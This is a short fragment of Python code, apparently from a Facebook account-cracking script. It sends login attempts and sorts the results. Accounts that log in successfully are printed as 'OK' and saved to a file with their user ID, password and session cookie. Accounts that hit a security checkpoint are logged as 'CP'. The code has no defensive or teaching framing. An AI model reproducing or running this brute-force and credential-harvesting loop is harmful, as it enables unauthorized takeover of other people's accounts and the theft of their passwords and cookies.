...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in po:
					...
					p('\r\033[1;92m[SKB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SKB_OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in po['error']['message']:
					p('\r\033[1;91m[SKB-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SKB_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
